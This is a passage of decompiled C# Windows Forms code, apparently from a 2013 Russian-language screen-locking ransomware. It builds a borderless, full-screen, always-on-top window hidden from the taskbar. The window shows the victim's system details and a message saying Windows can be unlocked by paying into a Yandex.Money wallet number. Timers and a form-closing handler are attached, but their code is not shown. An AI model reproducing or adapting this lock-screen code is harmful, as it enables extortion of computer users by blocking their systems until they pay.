		groupBox1.set_FlatStyle((FlatStyle)0);
		((Control)groupBox1).set_ForeColor(Color.Red);
		((Control)groupBox1).set_Location(new Point(12, 12));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(468, 213));
		((Control)groupBox1).set_TabIndex(15);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Информация");
		((Control)groupBox1).add_Enter((EventHandler)groupBox1_Enter);
		((Control)groupBox2).get_Controls().Add((Control)(object)label15);
		((Control)groupBox2).get_Controls().Add((Control)(object)label12);
		((Control)groupBox2).get_Controls().Add((Control)(object)label8);
		((Control)groupBox2).get_Controls().Add((Control)(object)label7);
		((Control)groupBox2).get_Controls().Add((Control)(object)label6);
		((Control)groupBox2).get_Controls().Add((Control)(object)label5);
		((Control)groupBox2).get_Controls().Add((Control)(object)label4);
		((Control)groupBox2).get_Controls().Add((Control)(object)label3);
		((Control)groupBox2).get_Controls().Add((Control)(object)label2);
		((Control)groupBox2).set_ForeColor(Color.Red);
		((Control)groupBox2).set_Location(new Point(12, 231));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(468, 259));
		((Control)groupBox2).set_TabIndex(16);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("О системе");
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label15).set_ForeColor(Color.Lime);
		((Control)label15).set_Location(new Point(6, 203));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(145, 13));
		((Control)label15).set_TabIndex(9);
		((Control)label15).set_Text("Windows Serial Number:");
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label12).set_ForeColor(Color.Lime);
		((Control)label12).set_Location(new Point(6, 180));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(150, 13));
		((Control)label12).set_TabIndex(7);
		((Control)label12).set_Text("Время работа системы:");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label8).set_ForeColor(Color.Lime);
		((Control)label8).set_Location(new Point(6, 158));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(117, 13));
		((Control)label8).set_TabIndex(6);
		((Control)label8).set_Text("Системное время:");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label7).set_ForeColor(Color.Lime);
		((Control)label7).set_Location(new Point(6, 133));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(62, 13));
		((Control)label7).set_TabIndex(5);
		((Control)label7).set_Text("IP адрес:");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label6).set_ForeColor(Color.Lime);
		((Control)label6).set_Location(new Point(6, 109));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(204, 13));
		((Control)label6).set_TabIndex(4);
		((Control)label6).set_Text("Кол-во свободной памяти (RAM):");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label5).set_ForeColor(Color.Lime);
		((Control)label5).set_Location(new Point(6, 86));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(123, 13));
		((Control)label5).set_TabIndex(3);
		((Control)label5).set_Text("Имя пользователя:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(6, 62));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(113, 13));
		((Control)label4).set_TabIndex(2);
		((Control)label4).set_Text("Имя компьютера:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_ForeColor(Color.Lime);
		((Control)label3).set_Location(new Point(6, 38));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(104, 13));
		((Control)label3).set_TabIndex(1);
		((Control)label3).set_Text("Папка системы:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_ForeColor(Color.Lime);
		((Control)label2).set_Location(new Point(6, 16));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(54, 13));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("Версия:");
		timer1.set_Enabled(true);
		timer1.set_Interval(20);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)groupBox3).get_Controls().Add((Control)(object)progressBar1);
		((Control)groupBox3).get_Controls().Add((Control)(object)label9);
		((Control)groupBox3).set_ForeColor(Color.Red);
		((Control)groupBox3).set_Location(new Point(12, 496));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(468, 120));
		((Control)groupBox3).set_TabIndex(17);
		groupBox3.set_TabStop(false);
		((Control)groupBox3).set_Text("Лог");
		((Control)progressBar1).set_ForeColor(Color.Red);
		((Control)progressBar1).set_Location(new Point(12, 79));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(443, 23));
		progressBar1.set_Style((ProgressBarStyle)1);
		((Control)progressBar1).set_TabIndex(1);
		((Control)progressBar1).set_Visible(false);
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label9).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label9).set_Location(new Point(6, 16));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(76, 25));
		((Control)label9).set_TabIndex(0);
		((Control)label9).set_Text("label9");
		((Control)groupBox4).get_Controls().Add((Control)(object)label13);
		((Control)groupBox4).get_Controls().Add((Control)(object)webBrowser1);
		((Control)groupBox4).set_ForeColor(Color.Red);
		((Control)groupBox4).set_Location(new Point(486, 12));
		((Control)groupBox4).set_Name("groupBox4");
		((Control)groupBox4).set_Size(new Size(784, 604));
		((Control)groupBox4).set_TabIndex(18);
		groupBox4.set_TabStop(false);
		((Control)groupBox4).set_Text("Веб-браузер");
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label13).set_ForeColor(Color.Lime);
		((Control)label13).set_Location(new Point(7, 20));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(569, 17));
		((Control)label13).set_TabIndex(1);
		((Control)label13).set_Text("Вы можете разблокировать Windows пополнив счет Яндекс денег 410011251002663\r\n");
		((Control)webBrowser1).set_Dock((DockStyle)2);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(3, 52));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(778, 549));
		((Control)webBrowser1).set_TabIndex(0);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)groupBox5).get_Controls().Add((Control)(object)label11);
		((Control)groupBox5).get_Controls().Add((Control)(object)label10);
		((Control)groupBox5).set_ForeColor(Color.Red);
		((Control)groupBox5).set_Location(new Point(12, 632));
		((Control)groupBox5).set_Name("groupBox5");
		((Control)groupBox5).set_Size(new Size(1255, 201));
		((Control)groupBox5).set_TabIndex(19);
		groupBox5.set_TabStop(false);
		((Control)groupBox5).set_Text("Причина");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_ForeColor(Color.FromArgb(64, 0, 0));
		((Control)label11).set_Location(new Point(1185, 185));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(64, 13));
		((Control)label11).set_TabIndex(1);
		((Control)label11).set_Text("©LDS 2013");
		((Control)label10).set_AutoSize(true);
		label10.set_FlatStyle((FlatStyle)0);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label10).set_ForeColor(Color.Red);
		((Control)label10).set_Location(new Point(8, 16));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(1236, 120));
		((Control)label10).set_TabIndex(0);
		((Control)label10).set_Text(componentResourceManager.GetString("label10.Text"));
		timer3.set_Interval(7200000);
		timer3.add_Tick((EventHandler)timer3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1280, 940));
		((Control)this).get_Controls().Add((Control)(object)groupBox5);
		((Control)this).get_Controls().Add((Control)(object)groupBox4);
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).set_ForeColor(Color.Lime);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.9);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)groupBox3).ResumeLayout(false);
		((Control)groupBox3).PerformLayout();
		((Control)groupBox4).ResumeLayout(false);
		((Control)groupBox4).PerformLayout();
		((Control)groupBox5).ResumeLayout(false);
		((Control)groupBox5).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
